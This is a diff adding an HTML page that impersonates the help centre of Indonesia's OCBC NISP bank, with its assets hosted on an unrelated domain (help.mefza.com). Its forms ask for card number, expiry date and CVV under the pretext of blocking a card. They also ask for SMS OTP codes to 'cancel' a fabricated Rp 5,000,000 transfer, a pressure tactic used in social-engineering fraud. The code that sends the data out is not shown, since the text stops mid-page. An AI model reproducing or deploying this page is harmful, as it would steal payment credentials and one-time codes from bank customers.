@@ -1,0 +1,1655 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terus Bersama Melaju Jauh | OCBC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .page {
+            display: none;
+            min-height: 100vh;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .page.active { display: flex; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            background: #fff;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .header img { height: 36px; }
+
+        .header-title {
+            font-size: 14px;
+            color: #003d79;
+            font-weight: 600;
+            text-transform: capitalize;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 24px 20px;
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* ===== SLIDER ===== */
+        .slider-container {
+            position: relative;
+            width: 100%;
+            border-radius: 14px;
+            overflow: hidden;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.12);
+            background: #e0e0e0;
+        }
+
+        .slider-track {
+            display: flex;
+            transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            will-change: transform;
+        }
+
+        .slider-slide {
+            min-width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .slider-slide img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .slider-slide-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.65));
+            color: #fff;
+        }
+
+        .slider-slide-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .slider-slide-desc {
+            font-size: 12px;
+            opacity: 0.9;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .slider-arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.85);
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        .slider-arrow:hover {
+            background: #fff;
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .slider-arrow svg { width: 18px; height: 18px; fill: #003d79; }
+
+        .slider-arrow-prev { left: 10px; }
+        .slider-arrow-next { right: 10px; }
+
+        .slider-dots {
+            position: absolute;
+            bottom: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .slider-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            padding: 0;
+        }
+
+        .slider-dot.active {
+            background: #fff;
+            width: 24px;
+            border-radius: 4px;
+        }
+
+        .slider-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #0066cc, #00aaff);
+            z-index: 10;
+            transition: width 0.1s linear;
+        }
+
+        .slider-counter {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.45);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            z-index: 10;
+        }
+
+        .slider-swipe-hint {
+            text-align: center;
+            font-size: 11px;
+            color: #aaa;
+            margin-top: -16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .slider-swipe-hint svg {
+            width: 14px;
+            height: 14px;
+            fill: #bbb;
+            animation: swipeHint 2s ease-in-out infinite;
+        }
+
+        @keyframes swipeHint {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(6px); }
+        }
+
+        /* ===== Service ===== */
+        .service-title { font-size: 20px; font-weight: 700; color: #003d79; margin-bottom: 8px; }
+        .service-desc { font-size: 14px; color: #666; margin-bottom: 24px; }
+
+        .service-list { display: flex; flex-direction: column; gap: 12px; }
+
+        .service-item {
+            background: #fff;
+            border-radius: 12px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border: 1px solid #eee;
+        }
+
+        .service-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border-color: #003d79;
+        }
+
+        .service-icon {
+            width: 44px;
+            height: 44px;
+            background: #e8f0fe;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .service-icon svg { width: 22px; height: 22px; fill: #003d79; }
+        .service-item-text { font-size: 15px; font-weight: 500; color: #333; }
+        .service-item-arrow { margin-left: auto; color: #999; font-size: 18px; }
+
+        /* ===== Form ===== */
+        .form-page-title { font-size: 20px; font-weight: 700; color: #003d79; margin-bottom: 8px; }
+        .form-page-desc { font-size: 14px; color: #666; margin-bottom: 24px; line-height: 1.5; }
+        .form-group { margin-bottom: 18px; }
+
+        .form-label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
+
+        .form-input, .form-select, .form-textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+            outline: none;
+            font-family: inherit;
+            background: #fff;
+        }
+
+        .form-input:focus, .form-select:focus, .form-textarea:focus { border-color: #003d79; }
+        .form-textarea { resize: vertical; min-height: 100px; }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #003d79;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover { background: #002d5c; }
+        .btn-primary:disabled { background: #999; cursor: not-allowed; }
+
+        .btn-primary.sending {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        .btn-primary.sending::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer {
+            to { left: 100%; }
+        }
+
+        .btn-outline {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #003d79;
+            border: 1.5px solid #003d79;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-outline:hover { background: #003d79; color: #fff; }
+
+        /* Card Visual */
+        .card-visual {
+            background: linear-gradient(135deg, #003d79, #0066cc);
+            border-radius: 14px;
+            padding: 24px;
+            margin-bottom: 24px;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-visual::after {
+            content: '';
+            position: absolute;
+            top: -30%;
+            right: -20%;
+            width: 200px;
+            height: 200px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+        }
+
+        .card-visual-label { font-size: 11px; opacity: 0.8; margin-bottom: 4px; }
+        .card-visual-number { font-size: 18px; letter-spacing: 2px; font-weight: 500; margin-bottom: 16px; }
+        .card-visual-row { display: flex; gap: 24px; }
+        .card-visual-item { font-size: 12px; }
+        .card-visual-item span { display: block; opacity: 0.7; font-size: 10px; margin-bottom: 2px; }
+
+        /* OTP */
+        .otp-section { text-align: center; }
+
+        .otp-icon {
+            width: 80px;
+            height: 80px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .otp-icon svg { width: 40px; height: 40px; fill: #003d79; }
+        .otp-phone { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .otp-phone strong { color: #333; }
+
+        .otp-timer {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #fff3e0;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #e65100;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .otp-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 24px; }
+
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .otp-input:focus { border-color: #003d79; }
+        .otp-hint { font-size: 13px; color: #666; margin-bottom: 24px; }
+
+        .btn-resend {
+            background: none;
+            border: none;
+            color: #003d79;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 8px;
+            text-decoration: underline;
+        }
+
+        /* Bank Selection */
+        .bank-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 24px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .bank-item {
+            background: #fff;
+            border: 1.5px solid #e8e8e8;
+            border-radius: 10px;
+            padding: 14px 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .bank-item:hover { border-color: #003d79; background: #f8fafd; }
+        .bank-item.selected { border-color: #003d79; background: #e8f0fe; }
+
+        .bank-item-radio {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .bank-item.selected .bank-item-radio { border-color: #003d79; }
+
+        .bank-item.selected .bank-item-radio::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #003d79;
+            border-radius: 50%;
+        }
+
+        .bank-item-name { font-size: 14px; color: #333; font-weight: 500; }
+
+        /* Success */
+        .success-section { text-align: center; padding: 40px 0; }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
+
+        .success-icon svg { width: 50px; height: 50px; fill: #2e7d32; }
+        .success-title { font-size: 22px; font-weight: 700; color: #003d79; margin-bottom: 12px; }
+        .success-desc { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+
+        .success-ref { background: #f5f5f5; border-radius: 10px; padding: 16px; margin-bottom: 24px; }
+        .success-ref-label { font-size: 12px; color: #888; margin-bottom: 4px; }
+        .success-ref-number { font-size: 18px; font-weight: 700; color: #003d79; letter-spacing: 1px; }
+
+        .success-details {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: left;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        .success-detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+        }
+
+        .success-detail-row:last-child { border-bottom: none; }
+        .success-detail-label { color: #888; }
+        .success-detail-value { color: #333; font-weight: 600; }
+
+        .warning-box {
+            background: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+        }
+
+        .warning-box svg { width: 20px; height: 20px; fill: #f57f17; flex-shrink: 0; margin-top: 1px; }
+        .warning-box p { font-size: 13px; color: #5d4037; line-height: 1.5; }
+
+        .info-box {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+        }
+
+        .info-box svg { width: 20px; height: 20px; fill: #1565c0; flex-shrink: 0; margin-top: 1px; }
+        .info-box p { font-size: 13px; color: #0d47a1; line-height: 1.5; }
+
+        .steps { margin-bottom: 24px; }
+        .step { display: flex; gap: 12px; margin-bottom: 16px; }
+
+        .step-number {
+            width: 28px;
+            height: 28px;
+            background: #003d79;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .step-text { font-size: 14px; color: #444; line-height: 1.5; padding-top: 3px; }
+
+        /* Footer */
+        .footer { background: #fff; padding: 20px; text-align: center; border-top: 1px solid #eee; }
+        .footer-logo { height: 28px; margin-bottom: 12px; }
+        .footer-text { font-size: 11px; color: #888; line-height: 1.6; }
+        .footer-copyright { font-size: 11px; color: #888; margin-top: 8px; }
+
+        .bi-footer { background: #f9f9f9; padding: 20px; text-align: center; border-top: 1px solid #eee; }
+        .bi-footer-text { font-size: 12px; color: #555; line-height: 1.7; max-width: 400px; margin: 0 auto; }
+        .bi-footer-text strong { color: #333; }
+        .bi-copyright { font-size: 11px; color: #888; margin-top: 10px; }
+
+        /* Loading */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.95);
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .loading-overlay.active { display: flex; }
+        .loading-overlay img { height: 48px; }
+        .loading-text { font-size: 14px; color: #666; }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #eee;
+            border-top-color: #003d79;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #003d79;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+            padding: 8px 0;
+            border: none;
+            background: none;
+        }
+
+        .back-btn:hover { opacity: 0.7; }
+
+        .progress-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 28px;
+            padding: 0 10px;
+        }
+
+        .progress-step { display: flex; align-items: center; }
+
+        .progress-dot {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+            transition: all 0.3s;
+            flex-shrink: 0;
+        }
+
+        .progress-dot.active { background: #003d79; color: #fff; }
+        .progress-dot.done { background: #2e7d32; color: #fff; }
+
+        .progress-line { width: 40px; height: 3px; background: #e0e0e0; transition: background 0.3s; }
+        .progress-line.active { background: #003d79; }
+
+        .checkbox-group { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 18px; }
+        .checkbox-group input[type="checkbox"] { width: 18px; height: 18px; margin-top: 2px; accent-color: #003d79; flex-shrink: 0; }
+        .checkbox-group label { font-size: 13px; color: #555; line-height: 1.5; }
+        .checkbox-group label a { color: #003d79; font-weight: 600; }
+
+        .summary-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border: 1px solid #eee;
+        }
+
+        .summary-card-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #003d79;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .summary-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 13px; }
+        .summary-label { color: #888; }
+        .summary-value { color: #333; font-weight: 500; }
+
+        /* Send status indicator */
+        .send-status {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-top: 12px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .send-status.sending {
+            display: flex;
+            background: #e3f2fd;
+            color: #1565c0;
+        }
+
+        .send-status.success {
+            display: flex;
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .send-status.error {
+            display: flex;
+            background: #fce4ec;
+            color: #c62828;
+        }
+
+        .send-status .mini-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #bbdefb;
+            border-top-color: #1565c0;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PAGE 1: INDEX -->
+    <div class="page active" id="page-index">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">pusat bantuan</span>
+        </div>
+        <div class="main-content">
+            <div class="slider-container" id="banner-slider">
+                <div class="slider-progress" id="slider-progress"></div>
+                <div class="slider-counter"><span id="slider-current">1</span> / 3</div>
+                <div class="slider-track" id="slider-track">
+                    <div class="slider-slide">
+                        <img src="https://help.mefza.com/ast/ban1.webp" alt="Banner 1">
+                        <div class="slider-slide-overlay">
+                            <div class="slider-slide-title">Blokir Kartu Kredit/Debit</div>
+                            <div class="slider-slide-desc">Lindungi kartu Anda dari penyalahgunaan</div>
+                        </div>
+                    </div>
+                    <div class="slider-slide">
+                        <img src="https://help.mefza.com/ast/ban2.webp" alt="Banner 2">
+                        <div class="slider-slide-overlay">
+                            <div class="slider-slide-title">Batalkan OTP Transaksi</div>
+                            <div class="slider-slide-desc">Batalkan transaksi mencurigakan dengan cepat</div>
+                        </div>
+                    </div>
+                    <div class="slider-slide">
+                        <img src="https://help.mefza.com/ast/ban3.webp" alt="Banner 3">
+                        <div class="slider-slide-overlay">
+                            <div class="slider-slide-title">Laporan ke Bank Lain</div>
+                            <div class="slider-slide-desc">Laporkan masalah transaksi antar bank</div>
+                        </div>
+                    </div>
+                </div>
+                <button class="slider-arrow slider-arrow-prev" onclick="sliderPrev()">
+                    <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+                </button>
+                <button class="slider-arrow slider-arrow-next" onclick="sliderNext()">
+                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L10 18l6-6-6-6-1.41 1.41L13.17 12z"/></svg>
+                </button>
+                <div class="slider-dots" id="slider-dots">
+                    <button class="slider-dot active" onclick="sliderGoTo(0)"></button>
+                    <button class="slider-dot" onclick="sliderGoTo(1)"></button>
+                    <button class="slider-dot" onclick="sliderGoTo(2)"></button>
+                </div>
+            </div>
+            <div class="slider-swipe-hint">
+                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L10 18l6-6-6-6-1.41 1.41L13.17 12z"/></svg>
+                Geser untuk melihat
+            </div>
+            <h2 class="service-title">Layanan Bank OCBC</h2>
+            <p class="service-desc">Bank OCBC menghadirkan Layanan berkualitas bagi Nasabah.</p>
+            <div class="service-list">
+                <div class="service-item" onclick="navigateTo('page-a')">
+                    <div class="service-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12zM4 0h16v2H4zM4 22h16v2H4zm8-10a2.5 2.5 0 0 0 2.5-2.5H17v-1h-2.5V9h-1v2.5H11V9h-1v2.5H7.5v1H10A2.5 2.5 0 0 0 12 15z"/></svg>
+                    </div>
+                    <span class="service-item-text">Blokir Kartu Kredit/Debit</span>
+                    <span class="service-item-arrow">›</span>
+                </div>
+                <div class="service-item" onclick="navigateTo('page-b')">
+                    <div class="service-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM11 5h2v6h-2zm0 8h2v2h-2z"/></svg>
+                    </div>
+                    <span class="service-item-text">Batalkan OTP transaksi</span>
+                    <span class="service-item-arrow">›</span>
+                </div>
+                <div class="service-item" onclick="navigateTo('page-d')">
+                    <div class="service-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6zm0 4h8v2H6zm10 0h2v2h-2zm-6-4h8v2h-8z"/></svg>
+                    </div>
+                    <span class="service-item-text">Laporan ke Bank lain</span>
+                    <span class="service-item-arrow">›</span>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 2: BLOKIR KARTU - FORM -->
+    <div class="page" id="page-a">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">cetak kartu</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-index')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot active">1</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">2</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">3</div></div>
+            </div>
+
+            <div class="card-visual">
+                <div class="card-visual-label">Nomor Kartu</div>
+                <div class="card-visual-number">•••• •••• •••• ••••</div>
+                <div class="card-visual-row">
+                    <div class="card-visual-item"><span>MASA BERLAKU</span>MM/YY</div>
+                    <div class="card-visual-item"><span>CVV</span>•••</div>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                <p>Pastikan Anda memasukkan data kartu dengan benar. Informasi kartu Anda akan diverifikasi untuk proses pemblokiran.</p>
+            </div>
+
+            <form id="block-card-form" onsubmit="handleBlockCard(event)">
+                <div class="form-group">
+                    <label class="form-label">Nomor kartu kredit/debit *</label>
+                    <input type="text" class="form-input" id="card-number" placeholder="Masukkan nomor kartu" maxlength="19" oninput="formatCardNumber(this)" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Masa berlaku *</label>
+                    <input type="text" class="form-input" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">CVV *</label>
+                    <input type="password" class="form-input" id="card-cvv" placeholder="Masukkan CVV" maxlength="4" required>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="agree-block" required>
+                    <label for="agree-block">Saya menyetujui <a href="#">Syarat & Ketentuan</a> pemblokiran kartu dan memahami bahwa kartu tidak dapat digunakan setelah diblokir.</label>
+                </div>
+                <button type="submit" class="btn-primary" id="btn-blokir">Blokir Sekarang</button>
+                <div class="send-status" id="send-status">
+                    <div class="mini-spinner"></div>
+                    <span id="send-status-text">Mengirim data...</span>
+                </div>
+            </form>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 3: BATALKAN OTP -->
+    <div class="page" id="page-b">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Batalkan OTP Transaksi</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-index')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot active">1</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">2</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">3</div></div>
+            </div>
+
+            <div class="otp-section">
+                <div class="otp-icon">
+                    <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/></svg>
+                </div>
+                <h2 class="form-page-title">Batalkan OTP Transaksi</h2>
+                <p class="otp-phone">Masukkan SMS Kode OTP yang telah dikirimkan ke Nomor <strong>+628x-xxxx</strong></p>
+                <div class="otp-timer">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    Kode kedaluwarsa dalam <span id="timer-b">60</span>s
+                </div>
+                <p class="otp-hint">Periksa pesan SMS Anda, lalu masukkan 6 digit kode yang Anda terima.</p>
+                <div class="otp-inputs" id="otp-inputs-b">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 0)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 1)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 2)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 3)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 4)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-b', 5)">
+                </div>
+                <button class="btn-primary" onclick="handleCancelOTP()">Batalkan Sekarang</button>
+                <button class="btn-resend" onclick="resendOTP('timer-b')">Kirim Ulang Kode</button>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 4: KONFIRMASI -->
+    <div class="page" id="page-b-confirm">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Konfirmasi Pembatalan</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-b')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot active">2</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">3</div></div>
+            </div>
+
+            <h2 class="form-page-title">Konfirmasi Pembatalan Transaksi</h2>
+            <p class="form-page-desc">Pastikan detail transaksi berikut sudah benar sebelum melanjutkan pembatalan.</p>
+
+            <div class="warning-box">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                <p>Pembatalan transaksi bersifat permanen dan tidak dapat dibatalkan kembali setelah dikonfirmasi.</p>
+            </div>
+
+            <div class="summary-card">
+                <div class="summary-card-title">Detail Transaksi</div>
+                <div class="summary-row"><span class="summary-label">Jenis Transaksi</span><span class="summary-value">Transfer Online</span></div>
+                <div class="summary-row"><span class="summary-label">Nominal</span><span class="summary-value">Rp 5.000.000</span></div>
+                <div class="summary-row"><span class="summary-label">Tujuan</span><span class="summary-value">BCA ••••7890</span></div>
+                <div class="summary-row"><span class="summary-label">Waktu</span><span class="summary-value" id="time-b">14 Jun 2025, 10:30</span></div>
+                <div class="summary-row"><span class="summary-label">Status</span><span class="summary-value" style="color:#e65100">Menunggu Pembatalan</span></div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree-cancel" required>
+                <label for="agree-cancel">Saya memahami bahwa transaksi ini akan dibatalkan secara permanen dan dana akan dikembalikan ke rekening asal.</label>
+            </div>
+
+            <button class="btn-primary" onclick="handleCancelConfirm()">Konfirmasi Pembatalan</button>
+            <button class="btn-outline" onclick="navigateTo('page-index')">Batalkan</button>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
